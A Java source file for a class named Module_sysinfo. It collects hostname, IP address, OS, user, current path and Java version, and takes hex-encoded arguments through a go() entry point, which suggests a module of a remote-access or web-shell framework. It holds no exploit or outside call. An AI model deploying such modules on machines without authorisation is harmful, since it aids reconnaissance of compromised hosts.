import java.io.*;
import java.util.*;
import java.text.*;
import java.util.regex.*;

import java.net.*;
import java.lang.*;


public class Module_sysinfo
{
    private final String SUCC_CODE = "0";
    private final String ERR_CODE  = "1";
    private final String JAVA_EOL  = getLineSeparator();

    private String getLineSeparator()
    {
        String os_name = System.getProperty("os.name");
        if (os_name.startsWith("Windows"))
            return "\r\n";
        else
            return "\n";
    }

    private byte[] hex2bin(String data) throws Exception
    {
        if ((data.length() % 2) == 1)
            throw new Exception("hex2bin(): data cannot have an odd number of digits");
        
        byte[] data_bytes = new byte[data.length() / 2];
        for (int i = 0; i < data.length(); i += 2)
        {
            String hs = data.substring(i, i + 2);
            try
            {
                int val = Integer.parseInt(hs, 16);
                data_bytes[i/2] = (byte)val;
            }
            catch(Exception e)
            {
                throw new Exception("hex2bin() failed to convert hex:'" + hs + "' to byte");
            }
        }
        return data_bytes;
    }

    private String bin2hex(byte[] ba) throws Exception
    {
        try
        {
            StringBuilder sb = new StringBuilder(ba.length * 2);
            for (byte b: ba)
                sb.append(String.format("%02x", b));
            return sb.toString();
        }
        catch(Exception e)
        {
            throw new Exception("bin2hex() failed");
        }
    }

    private String hex2str(String data) throws Exception
    {
        byte[] data_bytes = hex2bin(data);
        String data_string = new String(data_bytes);
        return data_string;
    }

    private String normalizePath(String currPath)
    {
        currPath = currPath.replace("\"", "");
        currPath = currPath.replace("'", "");
        currPath = currPath.replace("\\", "/");
        return currPath;
    }

    private String[] parseArgs(String args)
    {
        String regex = "\"[^\"]+\"|'[^']+'|\\S+";
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(args);
        List<String> arguments = new ArrayList<String>();

        while (matcher.find())
            arguments.add(matcher.group(0));

        String[] arguments_arr = new String[arguments.size()];
        arguments_arr = arguments.toArray(arguments_arr);
        return arguments_arr;
    }

    private String changeCWD(String cwd) throws Exception
    {
        File target_dir = new File(cwd).getAbsoluteFile();

        if (target_dir.exists() == false)
            throw new Exception("Directory: '" + cwd + "': does not exist");

        if (target_dir.canRead() == false)
            throw new Exception("Can't move to path: '" + cwd + "': permission denied");

        if (target_dir.isDirectory() == false)
            throw new Exception("Path: '" + cwd + "': is not a directory");

        System.setProperty("user.dir", target_dir.getCanonicalPath());

        return normalizePath(target_dir.getCanonicalPath());
    }

    private String getUsername() throws Exception
    {
        String os_name = System.getProperty("os.name");
        if (os_name.startsWith("Windows"))
            return InetAddress.getLocalHost().getHostName() + File.separator + System.getProperty("user.name");

        return System.getProperty("user.name");
    }

    private String[] doSysinfo()
    {
        String result = "";

        try
        {
            String hostname = InetAddress.getLocalHost().getHostName();
            String ip = InetAddress.getLocalHost().getHostAddress();
            String os = System.getProperty("os.name") + " " + System.getProperty("os.version") + " " + System.getProperty("os.arch");
            String user = getUsername();
            String path = System.getProperty("user.dir");
            String version = System.getProperty("java.runtime.name") + " " + System.getProperty("java.runtime.version");

            result  = "Hostname: " + hostname + JAVA_EOL;
            result += "IP: " + ip + JAVA_EOL;
            result += "OS: " + os + JAVA_EOL;
            result += "User: " + user + JAVA_EOL;
            result += "Path: " + path + JAVA_EOL;
            result += "Version: " + version + JAVA_EOL;

        }
        catch (Exception ex)
        {
            return new String[]{ERR_CODE, ex.getMessage() + JAVA_EOL};
        }

        return new String[]{SUCC_CODE, result};
    }

    public String[] execute(String[] args)
    {
        return doSysinfo();
    }

    public String[] go(String module_cwd, String module_args)
    {
        try
        {
            String new_cwd = changeCWD(hex2str(module_cwd));
            String[] args = parseArgs(hex2str(module_args));
            return execute(args);
        }
        catch(Exception ex)
        {
            return new String[]{ERR_CODE, ex.getMessage() + JAVA_EOL};
        } 
    }

    public static void main(String[] args)
    {
        Module_sysinfo m = new Module_sysinfo();
        String[] results = m.execute(args);
        System.out.println(results[1]);
        return;
    }
}